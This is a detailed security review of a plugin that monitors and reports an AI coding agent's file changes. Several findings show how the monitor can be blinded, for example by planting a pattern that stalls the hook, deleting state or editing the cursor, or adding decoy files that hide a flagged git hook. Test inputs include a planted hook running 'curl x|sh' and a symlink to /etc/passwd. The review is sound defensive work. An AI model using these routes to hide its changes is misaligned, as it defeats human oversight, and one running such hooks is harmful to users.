> **Note added at export.** The shell and awk plugin reviewed here was never merged. The plugin on main is a thin wrapper around `belay watch`, which was reviewed separately.

# Review of 690e902 (PR #125): belay plugin for Claude Code

## Verdict

Not ready to ship to strangers as it stands. The commit builds and its own suite passes (75 of 75, also under mawk and `gawk --traditional`), but I reproduced three ways a change is lost or miscounted with no word to the user, and one stated safeguard that does not hold. (1) With mawk as `awk`, a `.belay-donttouch` the agent writes makes the awk script run past the 60 s hook timeout; because the cursor is advanced before the line is produced, that interval's changes, a planted git hook included, never appear in any line or in the receipt file. (2) Hooks of one directory that run at the same time share `diff.json`/`diff.txt` and read the cursor before marking: four concurrent hooks each reported the same change (40 of 40 rounds, a 4x overcount at Stop), and with a delay injected between a hook's two diffs a flagged git hook was replaced by an empty `belay: ` line and "nothing changed this turn". (3) `$HOME` is refused only by the `start` event; every later hook walks and reports it. (4) Removing belay's state, or editing the cursor file, in the same call as a change makes that change vanish silently. Below those: a `SessionStart` in mid-turn wipes the turn's flags and its receipt, a growing directory on ext4 raises a false "privilege" flag, and several narrower flagging gaps.

Everything was run on Linux x86_64 (WSL2, ext4), dash as `sh`, gawk 5.2.1 and mawk 1.3.4 20240123, against `bin/belay` built in the worktree after `make clean`. The worktree's tracked files are unchanged (`git status --short` empty). No network was used.

Harness for the commands below (W = the worktree, T = a `mktemp -d`, P = `$T/proj`):

    hook() { printf '%s' "${IN:-$INPUT}" | env -u CLAUDE_CODE_ENTRYPOINT PATH="${XPATH:-$PATH}" HOME="$T/home" \
        CLAUDE_PROJECT_DIR="${DIR:-$P}" CLAUDE_PLUGIN_DATA="$T/data" BELAY_STATE_DIR="$T/state" \
        BELAY_HOOK_BINARY="${BIN:-$W/bin/belay}" ${XENV:-} sh "$W/claude-plugin/hooks/belay-hook" "$1"; }
    INPUT='{"session_id":"s","tool_name":"Bash","tool_input":{"command":"x"}}'

## Findings

### 1. HIGH — a pattern in `.belay-donttouch` hangs mawk; the interval is lost silently
Class: untrusted input compiled to a regex; state committed before the output it describes.

`g2r` turns each `**` into `.*` (belay-receipt.awk:39). mawk backtracks on a run of them. Directly, 251-byte path, pattern `**a` repeated k times: k=3 0.02 s, k=4 1.3 s, k=5 and k=6 over 20 s (killed by `timeout 20`). gawk is unaffected (40 repetitions, 3000-byte path: 0.32 s).

Through the hook, with `awk` = mawk (a directory holding `awk -> /usr/bin/mawk` first in PATH):

    hook start
    printf '**a**a**a**a**a**a**a\n' > $P/.belay-donttouch
    : > "$P/$(python3 -I -c 'print("a"*250+"b")')"
    printf '#!/bin/sh\ncurl x|sh\n' > $P/.git/hooks/pre-push
    ... | timeout 60 sh belay-hook post     -> rc=124 after 60s, output=[]
    hook post                               -> []
    hook stop                               -> belay: nothing changed this turn
    grep -c pre-push <receipt files>        -> 0

The 60 s is hooks.json's timeout for `post` (hooks.json:31, by reading; I stood in for it with `timeout 60`). The loss follows from the order in belay-hook: `advance` at line 221 moves the cursor, the awk runs at 239, the receipt is appended at 245-249. Anything that stops the hook between 221 and 249 loses the interval from both layers. Other instances of the same class: a timeout on a large tree during `diff --all` (226), and the `problem` exits at 227, 241 and 244, which at least say "no receipt" once.

mawk being the default `awk` on Debian and Ubuntu is from general knowledge, not checked here. busybox awk and BSD awk were not available: unknown.

### 2. HIGH — concurrent hooks of one directory count a change several times, and can drop a flagged one
Class: shared fixed-name temporaries and a read-then-act cursor with no lock.

(a) Reproduced, no delay injected. 300 files in the project, then 40 rounds of: rewrite `.git/hooks/pre-push`, start four `hook post` at once, wait.

    rounds=40 missed=0 duplicated=40
    hook stop -> belay: 🔴 160 flagged: .git/hooks/pre-push added (git hook); .git/hooks/pre-push added (git hook); .git/hooks/pre-push added (git hook); and 157 more flagged
                 belay: 160 changed this turn in 160 tool calls

40 changes were reported 160 times. Each hook reads the cursor (belay-hook:207) before any of them advances it. This contradicts the header ("a change is counted in exactly one line", belay-hook:40-41), README.md:40 and README.md:107-108 ("the first to finish shows what all of them had done by then").

(b) Reproduced with a delay injected. `BELAY_HOOK_BINARY` was a wrapper that sleeps 2 s once before `diff --all`; hook A (`post`, after `.git/hooks/pre-push` was written) was started, and hook B (`pre`, nothing changed) ran during the sleep:

    A: {"systemMessage":"belay: "}
    B: (nothing)
    turn/flagged: does not exist
    hook stop -> belay: nothing changed this turn

B's empty diff overwrote `$K/diff.json` (belay-hook:213) before A's awk read it (239-240). The git hook is in neither line. How often this window is hit without the injected delay is unknown; it did not occur in the 40 rounds of (a).

Same class, by reading: `$K/err`, `$T/calls`, `$T/incalls`, `$T/outside` (read-modify-write at 251-254), and `$T/receipt.txt` appends. Whether Claude Code runs the hooks of parallel tool calls, or of subagents, concurrently was not checked here; README.md:107 assumes it does.

### 3. HIGH — `$HOME` and `/` are refused only at `start`
Class: a guard on one entry point of several; a test that cannot fail.

    DIR=$T/home hook start   -> belay: no receipts here: .../home is too wide a directory to watch...
    echo secret > $T/home/.netrc
    DIR=$T/home hook post    -> {"systemMessage":"belay: 🔴 .netrc added (credentials)"}

The check is inside `if [ "$ev" = start ]` (belay-hook:184-185). After it, `pre`, `post`, `prompt` and `stop` find the binary executable (188), find no cursor (209), and walk the directory on every call. README.md:112-113 says "`$HOME` and `/` are refused". test.sh:227 ("and nothing is recorded there") passes only because nothing had changed in that directory; it would pass with or without a refusal.

### 4. MEDIUM — losing belay's state or the cursor is silent, and the agent can cause it
Class: fail-open on lost continuity.

    hook start; echo x > $P/x; hook post
    printf '#!/bin/sh\n' > $P/.git/hooks/pre-push; rm -rf $T/state
    hook post -> (nothing)      hook stop -> belay: 1 changed this turn in 1 tool call
    grep -c pre-push <receipt files> -> 0

and, with the state intact, `echo 999999 > $DATA/scopes/*/cursor` after writing `.git/hooks/pre-commit`: `hook post` prints nothing, the cursor is reset to the new checkpoint, the hook file is never reported. belay-hook:215-217 treats `diff` exit 2 as "start again from here" without a line; 209-212 does the same for a missing cursor. test.sh:217 pins the silence as intended. docs/cli.md gives exit 2 for any usage error, not only a missing checkpoint. Both locations are outside the project but writable by the agent's shell. A line saying the record was interrupted would cost nothing.

### 5. MEDIUM — a `start` in mid-turn deletes the turn's flags and its receipt
Class: state reset without flushing.

    hook start; printf '#!/bin/sh\n' > $P/.git/hooks/pre-push
    hook post  -> belay: 🔴 .git/hooks/pre-push added (git hook)
    hook start
    echo x > $P/x; hook post; hook stop
               -> belay: 1 changed this turn in 1 tool call · full receipt: /belay:receipt
    grep -c pre-push <fixed receipt and turns/*.txt> -> 0

`start` runs `turn_reset`, empties the fixed file and removes `$K/session` (belay-hook:180-182). The open turn's `receipt.txt` is deleted, never copied to `turns/`; the comment at 181 ("its turns stay in turns/") is true only of closed turns. It also sets the cursor to a new checkpoint without a diff (191-192), so what changed since the last hook is in no line (reproduced: `.env` written before a second `start` was never reported). This happens when a second session opens in the same directory. hooks.json:4-13 has no matcher on SessionStart; to my knowledge Claude Code also fires it on resume, `/clear` and compaction, which would do this in the middle of a turn. That last part is from memory of Claude Code's documentation, not verified.

### 6. MEDIUM — a directory that grows raises a false "privilege" flag on ext4
Class: false positive behind the red circle.

    mkdir $P/node_modules; hook start
    (create 400 empty files in node_modules); hook post
    -> belay: 🔴 ~ node_modules inode flags changed (privilege) · 401 more: 400 added, 1 metadata changed (400 under node_modules/)
    lsattr -d node_modules -> -----------I--e-------

ext4 sets the `I` (hashed index) flag when a directory outgrows one block. belay lists that in its privilege section and belay-receipt.awk:174-178 flags every line of it. The same appeared for the project root after 450 files. Any install that fills a directory will lead with a red circle on ext4. Other filesystems: unknown.

### 7. MEDIUM — only three flags are named, in path order; decoys push the real one out
Class: truncation chosen by the adversary.

    : > .env.a; : > .env.b; : > .env.c; (write .git/hooks/pre-commit); hook post
    -> belay: 🔴 .env.a added (credentials); .env.b added (credentials); .env.c added (credentials); and 1 more flagged
    hook stop -> same three, "and 1 more flagged"

`flags()` shows the first three in the diff's bytewise path order (belay-receipt.awk:115-121). Three names that sort before `.git/` keep a git hook out of both the call's line and the Stop line. The count and the red circle remain. Finding 8 makes this happen without an adversary.

### 8. MEDIUM — detail lines in the privilege section are flagged as separate privilege changes
Class: text parsed by indentation.

    (append to a file and chmod 4755 it); hook post
    -> belay: 🔴 M tool setuid added (mode 0644 -> 4755) (privilege); +3 -0 lines, first change at line 3 (privilege) · 1 more: 1 modified

`belay diff --all` prints the entry's findings indented under it; belay-receipt.awk:176-177 flags every line beginning with two spaces. Flag counts are inflated ("2 flagged" for one change) and a slot of the three is spent on "1 lines (privilege)". The shown text also keeps the `M`/`~`/`A` column of the text format.

### 9. MEDIUM — a symlink retargeted to a non-UTF-8 absolute path is not flagged; the same fail-open as non-UTF-8 names
Class: unrepresentable input treated as clean.

    ln -s a $P/l; ln -s a $P/m; hook post
    mkdir "$T/$(printf 'd\377')"
    ln -sfn "$T/$(printf 'd\377')/../../../../../../etc/passwd" $P/l; ln -sfn /etc/passwd $P/m; hook post
    -> belay: 🔴 m modified (symlink now points to /etc/passwd) · 1 more: 1 modified

belay writes `link_target_b64` for `l`; `field(..., "link_target")` finds nothing and the check at belay-receipt.awk:160-163 passes. Not in the README's limits. Related and documented (README.md:111): a path with any non-UTF-8 byte matches no pattern; reproduced with `venv/lib/site-packages/x\377.pth` and `x\377/.env`, both unflagged ("6 changes: 6 added"). Flagging what cannot be checked would close both. Also reproduced: replacing a file by a symlink over two calls (`rm`, then `ln -s /etc/passwd`) gives "f removed" then "f added", no flag; README.md:109 covers the second half.

### 10. MEDIUM — the JSON escaping depends on a gsub rule awks disagree on
Class: portability of `"\\\\"` as a gsub replacement.

`json()` uses `gsub(/\\/, "\\\\")` (belay-hook:86). Under POSIX rules that replacement is one backslash, so the call is a no-op. With `POSIXLY_CORRECT=1` in the environment, or `gawk --posix` as awk, `sh claude-plugin/test.sh bin/belay` gives 71 of 75: every output containing a backslash is invalid JSON (`"belay: 1 change: we\"ird \ name.txt added"`), including the whole `/belay:receipt` text. A file name with a backslash therefore removes the line it appears in. I tried to turn this into injected keys and could not: every quote in the name comes out preceded by a backslash, so no new string can open outside the first (reasoned, and one attempt run: Python rejects the output). `gsub(/["\\]/, "\\\\&")` is the same in both rule sets. Which rule busybox awk and macOS awk follow: unknown.

### 11. LOW — gaps in hooks/sensitive.txt
Established by running belay-receipt.awk (gawk and mawk, same results) over synthetic records. Not flagged: `.git/modules/sub/hooks/pre-commit`, `.git/worktrees/w/config.worktree`, `.git/config.worktree`, `.git/info/attributes`, `lefthook.yaml`, `.lefthook.yml`, `.devcontainer.json`, `id_ecdsa`, `.cargo/config`, `.github/dependabot.yaml`, a root `CODEOWNERS`, `CLAUDE.local.md`, `.pnpmfile.cjs`, `.vscode/extensions.json`. That each of these is honoured by its tool is from general knowledge, not probed. Over-matching: everything under a virtualenv named `.env/` is "credentials"; everything under `.claude/worktrees/` is "agent rules". `.git/hooks` itself added as a symlink matches no pattern (`**/.git/hooks/*` needs a child); replaced by one it is caught as "type changed" (reproduced). Matching is case-sensitive; on a case-insensitive macOS volume `claude.md` would not match (by reading).

### 12. LOW — `.belay-donttouch` forms that silently do nothing or differ from the README
Reproduced with the same harness:
- `*.gen  # generated` does not flag `x.gen`: the comment is part of the pattern. README.md:64 says "`#` starts a comment". Leading and trailing spaces are also kept (`trail ` does not flag `trail`).
- `docs/` flags `sub/docs/x`. README.md:62-63 says a pattern with a slash is taken from the root.
- `?`, `[ab]`, `!neg` are literal. The README does not promise them; users of gitignore will write them and nothing says they failed.
- `.git` in the list does not flag `.git/hooks/pre-commit.sample` modified: the `.sample` exemption (belay-receipt.awk:64) comes before every pattern, the user's included. README.md:55: "anything here is flagged, whatever happens to it".

### 13. LOW — a backslash in the project path disables the don't-touch list
`-v dont="$dont"` (belay-hook:239) has awk process escapes. Project directory `my\new\proj` with `secret.txt` in `.belay-donttouch`: `belay: 1 change: secret.txt added`, and stderr `awk: warning: escape sequence \p treated as plain p`. The same applies to `sens`, `json`, `text`, `flagout` if the plugin or data path held a backslash; a missing `sens` file means nothing is flagged and nothing is said (by reading: `load` ignores a failed getline).

### 14. LOW — control and invisible characters other than the listed bidi ones reach the line
A name holding U+009B (C1 CSI), DEL, U+2028, U+200B, U+FEFF and a tag character came through unchanged in `systemMessage` (`cat -A` of the output). `shown()` removes only bidi controls (belay-receipt.awk:94); `json()` removes only 0x01-0x1f (belay-hook:86). What a given terminal or the VS Code panel does with them: unknown. The receipt file is safe: belay's text escapes them (`\xc2\x9b`, `\x0a`).

### 15. LOW — the hook can exit 2
`env -u HOME -u CLAUDE_PLUGIN_DATA -u XDG_DATA_HOME ... sh belay-hook pre` -> `HOME: parameter not set`, exit 2 under dash (1 under bash). `set -u` (belay-hook:61) meets `$HOME` at line 65. Exit 2 from PreToolUse blocks the call, to my knowledge of Claude Code. Needs both variables unset; with `CLAUDE_PLUGIN_DATA` set the same failure at line 184 is inside a substitution and the hook exits 0.

### 16. LOW — smaller things
- The git-history line loses its meaning to the 80-byte cut: `belay: 🔴 ...9c05680e43e263acc41533324927e6095 -> 0fb3d813... (git history rewritten)` (reproduced; `shown()` at belay-receipt.awk:150 keeps the tail).
- README.md:33 "Three changes or fewer are named" holds only when nothing is flagged (belay-receipt.awk:185); otherwise "· 1 more: 1 added".
- README.md:98 and belay-hook:53 omit `find`, `tr`, `date`, `head`, `cut`, `wc`, `basename`, `uname`, `mkdir`, `mv`, `chmod`. `find -mmin` (belay-hook:196) is not POSIX.
- The turn closes only on Stop (belay-hook:276). A turn the user interrupts would run into the next and its totals add up (by reading; that Stop does not fire on interrupt is from memory).
- `publish` rewrites the fixed file with every earlier turn of the session on every changing call (belay-hook:144-154): cost grows with the session (by reading).
- The tool name is the first `"tool_name"` in the input (belay-hook:229). `{"tool_input":{"tool_name":"Read"},"tool_name":"Bash"}` is headed "after Read" (reproduced). Only the heading is affected, as the header says; the key order Claude Code sends is unknown.
- A failing belay at Stop exits through `problem` before `closed` is written, so no totals line and the turn stays open (by reading, belay-hook:208, 276).

### 17. Tests (claude-plugin/test.sh)
- Cannot fail for its stated reason: line 227 (finding 3).
- Line 234 runs the hook with the real `HOME` and no `BELAY_HOOK_BINARY`; it is safe only while the early exit at belay-hook:73 holds.
- Not covered: concurrent hooks; any awk but the system's; `fetch`; a `start` in mid-turn or a second session; lost state beyond "says nothing"; `link_target_b64`; a symlink to an absolute path (only `..`); git history rewritten; privilege other than setuid; the 80-byte cut; a receipt over 400 lines; PostToolUseFailure; `prune`; a hook that times out; the `receipt` event's exit status; hooks.json and plugin.json themselves.
- The commit message's "75 cases" is right.

## Checked and found fine

- `git log --oneline -1` in the worktree prints 690e902; suite 75/75 with gawk, mawk and `gawk --traditional`.
- The pinned linux-x86_64 sha256 equals `sha256sum` of the released binary in scratchpad/p1 (b6a59579...c7c6).
- Download path, by reading (belay-hook:102-122): digest compared before `chmod`/`mv`; no digest tool gives "unknown" and no run; `curl --max-time 60` under the 180 s start timeout; temporary inside `$DATA/bin`.
- Names with a quote, backslash, newline, ESC: valid JSON under default gawk and mawk; newline and ESC arrive as literal `\n`, `\u001b`; no name can add a line to `systemMessage`.
- Keys cannot be forged from strings in a diff record (`"outcome":"`, `"type":"`, `"after":{`): an escaped quote always carries a backslash that breaks the match (by reading belay-receipt.awk:86-89, 146-162).
- A name with newlines cannot end the privilege section early or forge receipt headings: belay's text prints `\x0a`.
- The bidi byte ranges in `shown()` are U+200E/F, U+202A-E, U+2066-9, U+061C; a cut never lands inside a UTF-8 character (60 two-byte characters, reproduced).
- Every regex metacharacter in a pattern is escaped: `a+b`, `(p)|q`, `^car$`, `x{1}.y`, `[`, `\` matched literally only and crashed neither awk. `/`, `//`, empty and blank patterns match nothing. `*`, `**`, `/**` match everything, as written.
- README's four example patterns behave as described: `migrations` at any depth and not `xmigrations`; `tests/fixtures/**` from the root only, not the directory itself; `*.lock` including `.lock`; `/LICENSE` at the root only, not `LICENSE.md`.
- `/.belay-donttouch` flags the root file only; `.git/hooks/*.sample` exempt, `.git/hooks/dir.sample/run` flagged; a directory added is not flagged itself.
- sensitive.txt: every non-comment line has a tab.
- `/belay:receipt`: another command's JSON is left alone; 450-line receipt is cut to 400 lines plus the pointer; the text passes through `json()`.
- setgid and sticky are flagged; a symlink to `/etc/passwd` and through `..` are flagged.
- Unknown event name, missing `CLAUDE_PROJECT_DIR`: exit 0, no output.
- A failed `getline` cannot loop (all loops test `> 0`).
- `A || B && problem` at belay-hook:184 groups as intended in sh.
- `cksum | tr`, `tr -c` on the basename, `wc -l` with leading blanks in `[ -gt ]`, `date -u +FORMAT`, `pwd -P`: nothing found against BSD userland, by reading only.

## Could not check

- macOS entirely, BSD awk, busybox awk, arm64. The arm64 and macOS digests.
- Anything about Claude Code itself: that `UserPromptExpansion`, `PostToolUseFailure`, `suppressOriginalPrompt` and `systemMessage` behave as the hook assumes; whether the block `reason` reaches the model; which SessionStart sources fire; whether hooks of parallel calls run concurrently; what it does with invalid JSON or with a timed-out hook's children; the version numbers in README.md:23.
- The install command `claude plugin install belay --marketplace Allexsen/belay` (README.md:19, root README, commit message): not run, and I do not know that `--marketplace` is an accepted flag.
- `code --reuse-window` against a real VS Code; the workspace-trust prompt described in README.md:81-84.
- `prune` running detached at `start`, and its interaction with a second session's cursor.
- File capabilities and `chattr` flags (need root).
- Cost on a large tree (README.md:112 says unmeasured; I did not measure either).
